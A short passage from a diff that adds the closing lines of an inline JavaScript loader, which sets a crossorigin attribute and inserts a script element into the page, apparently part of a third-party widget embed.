+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
